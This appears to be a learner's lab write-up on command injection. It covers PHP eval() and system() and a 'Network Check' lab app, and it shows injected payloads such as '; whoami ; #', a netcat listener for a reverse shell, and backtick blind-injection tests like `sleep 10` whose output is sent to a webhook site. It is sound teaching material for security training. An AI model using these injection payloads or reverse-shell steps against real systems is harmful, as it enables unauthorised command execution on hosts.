## Command Injection

Very serious finding.  In programing, using functions like eval() and system() can lead to some not so great things.  Especially if a user can get to using them.  This can lead to compromising not only the application but the host as well.

What `eval()` does is it runs the code inside of it.  As a quick example, we have this.  The first `eval()` statement equaling 2.  And then setting a variable (`userInput`) equal to `7*7` and then you run that bit of code inside `eval(userInput)` and you get the output of 49, since 7 times 7 is 49.

![ScreenShot1.png](Images2/ScreenShot1.png)

You can also check this via terminal and use it to test different things.

```
(kali@kali)-$ php -a
Interactive shell

php > $userInput = 'whoami';
php > system($userInput);
kali
php >
```

![ScreenShot2.png](Images2/ScreenShot2.png)

Here we're doing the same thing but in PHP with an interactive shell (`php -a`).

You can also look at `https://book.hacktricks.wiki/en/pentesting-web/command-injection.html` for some testing bits.

### Basics

You're not likely to run into something like this coming lab on a public facing site but it's not impossible to see if if you get onto an internal device somehow.

This appears to be a "Network Check" application.  It gives you an address bar and even a handy example in the input box to help you understand what is being asked.  So we try it and get the following.

![ScreenShot3.png](Images2/ScreenShot3.png)

Here we see the example in the text box, we see the command that is ran from the input we put in.  And we have the result of said command.

If we put something in like `http://localhost/ ; whoami` or `http://localhost/ ; whoami ;` we don't get anything back.  But, if we try `http://localhost/ ; whoami; #` and use the # sign to essentially end the statement...

![ScreenShot4.png](Images2/ScreenShot4.png)

Here we see at the end that we do have the command `whoami` run there at the end.  I can even change it a bit more and clean up what I'm looking at by finishing out the meant to be `grep` command and THEN put my injected command.

`http://localhost | grep "HTTP/" ; whoami ; #`

![ScreenShot5.png](Images2/ScreenShot5.png)

You can also put in just `; whoami ; #` and get just the `www-data` back.

![ScreenShot6.png](Images2/ScreenShot6.png)

Now that we know that, we can do some code execution and get a reverse shell.

We can use the commands like `which php` and `which python` to see what is installed on the box, and use that on PayloadsAllTheThings to find a payload to get reverse shell.  Don't forget to start your listener `nc -nlvp 4444`

![ScreenShot7.png](Images2/ScreenShot7.png)

### Blind Command Injection

Blind command injection is when you do not see the output directly on the screen.  You may see, for example, Website OK but you won't see the output that was in the last example where you had the whole line, `HTTP/2 200 OK` returned.

For this one, we can test with something simple to put in, like ```http://localhost?q=`sleep 10` ``` (please note that the tac -next to the number 1 on the keyboard- is used, not the single quote).  If you put this in though and the site hangs, it's a good bet you have blind injection.

You can then take a website and add ``` /?q=`whoami` ``` and you should get in the response with the command "whoami" attached to the end.

![ScreenShot8.png](Images2/ScreenShot8.png)

![ScreenShot9.png](Images2/ScreenShot9.png)

Here we have the same website.hook site.  In the web app we input the `whoami` portion with the tacs and we get back the user `www-data` in our response.  Again, be sure to use the `/?q=` at the end and put your command in tacs (``` ` ```).